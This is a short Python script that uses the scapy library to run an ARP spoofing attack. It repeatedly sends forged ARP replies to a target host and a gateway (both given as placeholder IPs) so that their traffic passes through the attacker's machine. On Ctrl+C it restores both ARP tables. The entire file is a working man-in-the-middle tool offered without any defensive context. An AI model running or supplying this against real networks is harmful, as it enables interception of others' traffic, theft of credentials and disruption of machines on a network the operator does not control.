import sys
import time
import scapy.all as scapy


def get_mac(ip_address):
    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    retries = 4
    for i in range(retries):
        answered_list = scapy.srp(arp_request_broadcast, timeout=1,verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc

    return ""


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "1.1.1.1"
gateway_ip = "1.1.1.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip=target_ip, spoof_ip=gateway_ip)
        spoof(target_ip=gateway_ip, spoof_ip=target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ....... Quitting and resetting ARP tables, please wait.......")
    restore(destination_ip=target_ip, source_ip=gateway_ip)
    restore(destination_ip=gateway_ip, source_ip=target_ip)

